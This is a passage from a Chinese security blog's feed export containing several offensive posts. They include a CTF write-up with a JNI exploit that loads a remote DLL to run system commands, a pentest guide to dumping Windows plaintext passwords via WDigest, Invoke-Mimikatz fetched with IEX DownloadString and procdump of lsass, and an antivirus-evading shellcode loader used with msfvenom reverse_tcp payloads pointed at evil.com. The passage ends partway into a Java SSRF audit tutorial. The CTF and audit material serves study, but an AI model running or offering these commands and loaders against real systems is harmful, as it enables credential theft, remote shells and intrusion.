class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException, Base64DecodingException &#123;</span><br><span class="line">        //释放动态库</span><br><span class="line">        String dynlib = &quot;z/rt/+AQAAAOglAAAAvwIAAAC+AQAAAEiJRejoEgAAALEBD7b5SIlF4In4SIPEIF3DkP8lZhAAAAAATI0dZRAAAEFT/yVVAAAAkGgAAAAA6eb///==（省略）&quot;;</span><br><span class="line">        File dynlibFile = new File(&quot;/tmp/.jayl1n&quot;);</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(dynlibFile);</span><br><span class="line">        fileOutputStream.write(Base64.decode(dynlib));</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        //加载动态库</span><br><span class="line">        System.load(&quot;/tmp/.jayl1n&quot;);</span><br><span class="line">        //调用</span><br><span class="line">        new Main().ignoreSignal();</span><br><span class="line">        AtomicInteger i = new AtomicInteger();</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo &quot; + i.getAndIncrement() + &quot; &gt;&gt; /tmp/test&quot;&#125;);</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/02/13/java-nohup-implementation/xg.gif" alt="效果"></p><h1 id="进阶-——-免疫-kill-命令"><a href="#进阶-——-免疫-kill-命令" class="headerlink" title="进阶 —— 免疫 kill 命令"></a>进阶 —— 免疫 kill 命令</h1><p>kill 命令默认是发送 <code>SIGTERM</code> 信号，友好地通知进程该结束了。进程在这种情况下可以不响应 <code>SIGTERM</code>（即忽略），继续执行下去。</p><p>也就是说只要再 <code>signal(SIGTERM, SIG_IGN);</code> 就可以防止被 kill 杀掉了，经过测试确实可以实现，有兴趣的可以自己试一下。</p><p>不过，当 kill 命令带参数时（kill -9），发送的是 <code>SIGKILL</code> 信号，这个信号无法被捕获或忽略，CTF 里有常用的杀不死马的方法 <code>kill -9 -1</code>(杀死除init进程外的所有进程)，此时，程序无法感知到 <code>SIGKILL</code> 信号，就被系统干掉了。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://people.cs.pitt.edu/~alanjawi/cs449/code/shell/UnixSignals.htm" target="_blank" rel="noopener">Unix Signals</a></p><p><a href="https://my.oschina.net/LinBigR/blog/799561" target="_blank" rel="noopener">Nohup源码分析</a></p><p><a href="https://blog.csdn.net/z50L2O08e2u4afToR9A/article/details/80047865" target="_blank" rel="noopener">一分钟了解nohup和&amp;的功效</a></p><p><a href="https://blog.csdn.net/weixin_39540568/article/details/87985417" target="_blank" rel="noopener">kill命令——系统内部执行流程</a></p><p><a href="https://blog.csdn.net/madpointer/article/details/13091705" target="_blank" rel="noopener">不可忽略或捕捉的信号—SIGSTOP和SIGKILL</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;常用的将程序放到后台执行，并在shell退出后依然运行的方法，是使用 &lt;code&gt;nohup&lt;/code&gt; 与 &lt;code&gt;&amp;amp;&lt;/code&gt;，比如 &lt;code&gt;nohup java -jar abc.jar &amp;amp;&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&quot;原理&quot;
      
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2020 大家新年快乐鸭</title>
    <link href="https://jayl1n.github.io/2020/01/04/happy-new-year-2020/"/>
    <id>https://jayl1n.github.io/2020/01/04/happy-new-year-2020/</id>
    <published>2020-01-03T17:33:41.000Z</published>
    <updated>2020-01-03T17:54:12.258Z</updated>
    
    <content type="html"><![CDATA[<p>距离上次写博客已经隔了大半年，由于中间换了MacBook，又急急忙忙的赶去实习，原来博客的源码一直没时间迁移过来（就是懒），所以很久都没有发文了。</p><p>目前我在某美股上市公司做红蓝对抗，实习了这么久，收获了挺多，打算有时间了写出来。</p><p>敬请关注，祝大家新年快乐～ （手动龇牙</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;距离上次写博客已经隔了大半年，由于中间换了MacBook，又急急忙忙的赶去实习，原来博客的源码一直没时间迁移过来（就是懒），所以很久都没有发文了。&lt;/p&gt;
&lt;p&gt;目前我在某美股上市公司做红蓝对抗，实习了这么久，收获了挺多，打算有时间了写出来。&lt;/p&gt;
&lt;p&gt;敬请关注，祝大家
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SCTF2019 babyEoP Writeup</title>
    <link href="https://jayl1n.github.io/2019/06/26/sctf-2019-babyEoP-Writeup/"/>
    <id>https://jayl1n.github.io/2019/06/26/sctf-2019-babyEoP-Writeup/</id>
    <published>2019-06-26T06:37:52.000Z</published>
    <updated>2019-08-19T14:29:15.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 第一次给比较正式的比赛出题 :) ，花了挺长时间准备的。之前还一直担心题目太简单被神仙们秒了，看结果还是阔以的——0解，也有些遗憾，没能让 Part 2 出来。</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><p>题目给了一个webshell，弱口令 123456 直接进去。</p><p>Tomcat启用了<em>Java Security Manager</em>，webshell基本所有功能无法正常使用，但是可以查看有限的几个目录文件，无写权限。</p><p>如果顺利，应该可以收集到以下信息：</p><ol><li><p>cookie处存在反序列化的点，有反序列化漏洞。</p></li><li><p>查看lib目录，存在 commons-collections 3.1 gadget。</p></li><li><p>找到 <code>catalina.policy</code> 文件，是Tomcat默认的安全策略配置文件，这应该是本题可能有点脑洞的地方，因为没有给 <code>C:/babyEoP/apache-tomcat-8.5.42</code> 的读权限，所以无法列目录，但是 <code>conf</code> 目录是可读的。（有将近10位选手读到了这个文件hhhh。）</p><p>我在官方提供的 <code>catalina.policy</code> 的基础上，做了一些修改。给了 <em>LoadLibrary</em> 、 <em>createClassLoader</em>、 <em>accessDeclaredMembers</em> 几个重要权限。</p></li></ol><p>分析 policy ，应该很容易可以想到，要通过 JNI 绕过 <em>Java Security Manager</em>。但是 JNI 需要加载一个 dll 动态链接库，由于并没有给任何写权限，所以是不可能上传 dll 的。</p><p>并且，webshell 的 <code>Eval Java Code</code> 使用时，需要向当前目录写一个 <code>tmp.jsp</code> 文件，所以也是不能用的（不要想着用这个执行代码）。</p><p>那么该如何才能执行代码来加载一个不在本地的dll呢？</p><p>下面是具体的解题思路：</p><p>题目已经给了反序列化的点以及gadget，可以通过这个来执行代码。</p><blockquote><p>ysoserial 的 commons-collections 利用链提供了几个直接执行命令的 gadget，但是都是基于 Runtime.exec 的，并没有给这个权限。So 想要直接利用是不行的。</p></blockquote><p>但是直接用 gadget 构造出加载dll可能比较困难，所以这里可以利用稍微高级一点的方法——加载外部的jar来执行代码。</p><p>构造见 <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> (基于 CommonsCollections6)</p><blockquote><p>有些师傅用的 CommonsCollections5 gadget 改的，但是 BadAttributeValueExpException 在反序列化时，会检查是否启用 JSM，如果启用了，则不会触发 gadget 需要的 toString 方法，导致利用失败。</p></blockquote><p>下面要加载 dll，用 JNI 绕 JSM。</p><p>同样因为没有写权限，且 dll 无法一起打包到 jar 里，所以要从网络上加载 dll。</p><p>这里利用 <code>System.load</code> 的一个特性——可以使用 UNC 路径，加载远程的 dll。</p><p>为什么可以使用 UNC 呢？来看下 System.load 的调用过程。</p><ol><li>System.load</li></ol><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382235958.png" alt="1561382235958"></p><p>​  调用了 Runtime.getRuntime().load0</p><ol start="2"><li><p>Runtime.getRuntime().load0</p><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561383875593.png" alt="1561383875593"></p></li></ol><p>​  在这里会判断 filename 是否是一个绝对路径，如果不是就直接抛出异常，是就进一步加载。</p><ol start="3"><li><p>File.isAbsolute</p><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382827270.png" alt="1561382827270"></p><p>再看看 File 是如何判断是否是绝对路径的。</p><p>根据描述，linux下要求以 <code>/</code> 开头。windows下，要求以盘符或者 <code>\\\\</code> 开头。</p></li></ol><p>emm 综上，所以这里可以使用 UNC 路径。</p><p>下面是另一个坑，UNC 默认是走 445 端口的，如果没有特殊情况，公网上都是屏蔽了这个端口的。</p><p>这里利用 windows 一个特性，在开启了 webclient 服务的情况下，UNC 访问 445 失败时，会尝试访问目标服务器80端口的 webdav 去加载资源 (‾◡◝)， 这一点 hint 已经提示过了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>R.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">R</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">    System.load(<span class="string">"\\\\xxx.xxx.xxx.xxx\\JNI.dll"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">R</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac R.java</span><br><span class="line">jar cvf R.jar R.class</span><br></pre></td></tr></table></figure><p>将打包的 R.jar 放到服务器上的 web 服务下。</p><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><h4 id="R-h"><a href="#R-h" class="headerlink" title="R.h"></a>R.h</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line">JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">(JNIEnv *, jclass, jstring);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><h4 id="R-cpp"><a href="#R-cpp" class="headerlink" title="R.cpp"></a>R.cpp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;R.h&quot;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">(JNIEnv *env, jclass clazz, jstring str) &#123;</span><br><span class="line">char* cmd= (char*)env-&gt;GetStringUTFChars(str,JNI_FALSE);</span><br><span class="line">system(cmd);</span><br><span class="line">env-&gt;ReleaseStringUTFChars(str,cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成 dll，放到服务器的 webdav 服务下。</p><p>用 <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> 构造序列化 payload，贴到 cookie 里打一发，完事儿~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt; 第一次给比较正式的比赛出题 :) ，花了挺长时间准备的。之前还一直担心题目太简单被神仙们秒了，看结果还是阔以的——0解，也有些遗憾，没能让
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://jayl1n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows下抓取明文密码</title>
    <link href="https://jayl1n.github.io/2019/03/29/pentest-getpassword/"/>
    <id>https://jayl1n.github.io/2019/03/29/pentest-getpassword/</id>
    <published>2019-03-29T11:32:22.000Z</published>
    <updated>2020-07-12T08:08:57.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于-KB2871997"><a href="#关于-KB2871997" class="headerlink" title="关于 KB2871997"></a>关于 KB2871997</h1><p>在 <code>KB2871997</code> 之前， Mimikatz 可以直接抓取明文密码。</p><p>当服务器安装 <code>KB2871997</code> 补丁后，系统默认禁用 <code>Wdigest Auth</code> ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 <code>Wdigest Auth</code>，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p><p>以下是支持的系统:</p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li><li>Windows Server 2008</li><li>Windows Server 2012</li><li>Windows Server 2012R 2</li></ul><h2 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h2><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li></ul><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li></ul><h1 id="强制锁屏"><a href="#强制锁屏" class="headerlink" title="强制锁屏"></a>强制锁屏</h1><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能逮到明文密码。</p><p>我们可以强制锁屏，让管理员重新登录。</p><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>经测试 Win10企业版 仅锁屏读明文失败，需要注销才行，其它版本未知。</p></blockquote><h1 id="抓取明文"><a href="#抓取明文" class="headerlink" title="抓取明文"></a>抓取明文</h1><p>开启 <code>Wdigest Auth</code> 后，接下来就用常规的抓取明文的方式就行了。</p><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><ol><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure></li><li><p>exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li></ol><h2 id="离线抓取"><a href="#离线抓取" class="headerlink" title="离线抓取"></a>离线抓取</h2><p>当 <code>Mimikatz</code> 被杀，可以先将 <code>lsass</code> 进程 <code>dump</code> 下来，在本地用 <code>Mimikatz</code> 读取。</p><ol><li><p>Dump 进程</p><p>可以用微软提供的 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener"><code>procdump</code></a> ，自带微软签名，可以过杀软。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></li><li><p>Mimikatz 读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关于-KB2871997&quot;&gt;&lt;a href=&quot;#关于-KB2871997&quot; class=&quot;headerlink&quot; title=&quot;关于 KB2871997&quot;&gt;&lt;/a&gt;关于 KB2871997&lt;/h1&gt;&lt;p&gt;在 &lt;code&gt;KB2871997&lt;/code&gt; 之前， M
      
    
    </summary>
    
    
    
      <category term="Pentest" scheme="https://jayl1n.github.io/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>【GSL】 从内存加载 SHELLCODE 绕过AV查杀</title>
    <link href="https://jayl1n.github.io/2019/01/08/tools-load-shellcode/"/>
    <id>https://jayl1n.github.io/2019/01/08/tools-load-shellcode/</id>
    <published>2019-01-08T07:08:15.000Z</published>
    <updated>2019-08-19T14:29:15.837Z</updated>
    
    <content type="html"><![CDATA[<p>根据 <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">go-shellcode</a> 修改，原作者用命令行传 SHELLCODE 的方式有点麻瓜，所以修改了一番。</p><p>亲测可绕 360全家桶。</p><p>X86 &amp; X64 的 SHELLCODE 都可以，用对应 <code>gsl</code> 加载就行了。</p><p>下载：【<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl32.exe" target="_blank" rel="noopener">X86</a>】 【<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl64.exe" target="_blank" rel="noopener">X64</a>】</p><blockquote><p>为减小体积，已用 UPX 加壳压缩。</p></blockquote><a id="more"></a><h1 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h1><p>首先要准备好 SHELLCODE，支持 MSF 的 <code>RAW</code> 和 <code>HEX</code> 格式。</p><h2 id="生成-SHELLCODE"><a href="#生成-SHELLCODE" class="headerlink" title="生成 SHELLCODE"></a>生成 SHELLCODE</h2><h3 id="X86"><a href="#X86" class="headerlink" title="X86"></a>X86</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=evil.com LPORT=666 -f raw &gt; evil.raw</span><br></pre></td></tr></table></figure><h3 id="X64"><a href="#X64" class="headerlink" title="X64"></a>X64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=evil.com LPORT=666 -f hex &gt; evil.hex</span><br></pre></td></tr></table></figure><h2 id="加载-SHELLCODE"><a href="#加载-SHELLCODE" class="headerlink" title="加载 SHELLCODE"></a>加载 SHELLCODE</h2><p>有三种方式。</p><h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>从参数传入 <strong>（必须是HEX格式）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -s SHELLCODE -hex</span><br></pre></td></tr></table></figure><h3 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h3><p>从文件传入，需要先把 SHELLCODE 文件传到目标服务器上</p><ul><li><p>加载 RAW 格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -f evil.raw</span><br></pre></td></tr></table></figure></li><li><p>加载 HEX 格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -f evil.hex -hex</span><br></pre></td></tr></table></figure></li></ul><h3 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h3><p>从远程服务器加载，把 SHELLCODE 文件挂在WEB目录下。（支持HTTP/HTTPS）</p><ul><li><p>加载 RAW 格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -u http://evil.com/evil.raw</span><br></pre></td></tr></table></figure></li><li><p>加载 HEX 格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -u http://evil.com/evil.hex -hex</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据 &lt;a href=&quot;https://github.com/brimstone/go-shellcode&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;go-shellcode&lt;/a&gt; 修改，原作者用命令行传 SHELLCODE 的方式有点麻瓜，所以修改了一番。&lt;/p&gt;
&lt;p&gt;亲测可绕 360全家桶。&lt;/p&gt;
&lt;p&gt;X86 &amp;amp; X64 的 SHELLCODE 都可以，用对应 &lt;code&gt;gsl&lt;/code&gt; 加载就行了。&lt;/p&gt;
&lt;p&gt;下载：【&lt;a href=&quot;https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl32.exe&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;X86&lt;/a&gt;】 【&lt;a href=&quot;https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl64.exe&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;X64&lt;/a&gt;】&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为减小体积，已用 UPX 加壳压缩。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="工具分享" scheme="https://jayl1n.github.io/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>从1开始的Java代码审计·第四弹·SSRF</title>
    <link href="https://jayl1n.github.io/2018/12/30/java-audit-step-by-step-4/"/>
    <id>https://jayl1n.github.io/2018/12/30/java-audit-step-by-step-4/</id>
    <published>2018-12-29T16:17:42.000Z</published>
    <updated>2019-08-19T14:29:15.832Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近的事情真的太多了 <strong>≧﹏≦</strong> ，趁着刚搞完小组的面试，发篇热乎的。</p></blockquote><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>自从 2016 年猪猪侠在乌云峰会发表议题——<a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">《Build Your SSRF Exploit Framework》</a>，<code>SSRF</code> 才开始火起来的吧，攻击面越来越广，利用某些奇技淫巧可以直接GETSHELL。</p><p><code>SSRF</code> 的介绍、利用方式，PDF里都有讲，就不再赘述了，开始进入正题。</p><h1 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h1><p>Java 支持的协议可以在 <code>sum.net.www.protocol</code> 包下看到，如下图：</p><p><img src="/2018/12/30/java-audit-step-by-step-4/java-protocol.png" alt="java-protocol"></p><p>图中用的 JDK 是 <code>1.7</code>，可以看到有 <code>gopher</code> <code>file</code> <code>ftp</code> <code>http</code> <code>https</code> <code>jar</code> <code>mailto</code> <code>netdoc</code> 八种协议。其中最有意思的是 <code>gopher</code> 协议，可以用来构造其它协议的请求。但是，<strong><code>gopher</code> 在 <code>JDK8</code> 中已经被移除。</strong> 经过测试，在高版本的 <code>JDK7</code> 里，虽然 <code>sun.net.www.protoocol</code> 中还有 <code>gopher</code> 包，但是实际也已经不能使用，会抛 <code>java.net.MalformedURLException: unknown protocol: gopher</code> 的异常，被阉割地时间在2012年左右（From <a href="http://www.k0rz3n.com" target="_blank" rel="noopener">@K0rz3n</a>）。</p><h1 id="发起请求的流程"><a href="#发起请求的流程" class="headerlink" title="发起请求的流程"></a>发起请求的流程</h1><p>构造一个简单的 <code>http</code> 请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">    URLConnection urlConnection = u.openConnection();</span><br><span class="line">    InputStream inputStream = urlConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简述下这个过程，首先，构造一个 <code>URL</code> 对象，调用 <code>url</code> 的 <code>openConnection()</code> 方法来获取一个 <code>URLConnection</code> 实例，然后再调 <code>getInputStream()</code> 拿到 <code>InputStream</code>，也就是请求的响应流。之后，再做我们想要的其它事情。</p><p>在这个过程中，如果 <code>URL</code> 是可控的，那么就会存在 <code>SSRF</code> 漏洞。</p><p>下面分析下主要的几个方法。</p><h2 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL()"></a>new URL()</h2><p>构造一个 <code>URL</code> 对象，构造时，可以指定 <code>协议</code>，<code>HOST</code>，<code>端口</code>，<code>文件路径</code>，<code>URLStreamHandler</code>。</p><p>其中，<code>URLStreamHandler</code> 是一个抽象类，每个协议都有继承它的子类 —— <code>Handler</code>（可以在各协议的包下找到）。<code>Handler</code> 定义了该如何去打开一个连接（ <code>openConnection()</code> ）。</p><p>如果是直接传入一个 <code>URL</code> 字符串，会在构造对象时，根据 <code>protocol</code> 自动创建对应的 <code>Handler</code> 对象。</p><h2 id="openConnection"><a href="#openConnection" class="headerlink" title="openConnection()"></a>openConnection()</h2><p>每次调用 <code>openConnection()</code> 时，都会创造一个新的实例，也就是 <code>URLConnection</code>。但是，<strong>在实例创建时，真实的网络连接实际上并没有建立</strong>。只有在调用 <code>URLConnection.connect()</code> 方法后才会建立连接。</p><h2 id="getInputStream"><a href="#getInputStream" class="headerlink" title="getInputStream()"></a>getInputStream()</h2><p>从打开的连接获取一个 <code>InputStream</code>，可以从中得到 <code>URL</code> 请求的响应流。在调用这个方法时，会自动调用 <code>URLConnection.connect()</code> 方法，也就是建立连接。所以一旦调用 <code>getInputStream()</code> 连接就已经建立好了，不管后续做什么操作，这个 <code>URL</code> 请求都已经发出去了。</p><h2 id="另一种写法"><a href="#另一种写法" class="headerlink" title="另一种写法"></a>另一种写法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) u.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">con.setRequestProperty(<span 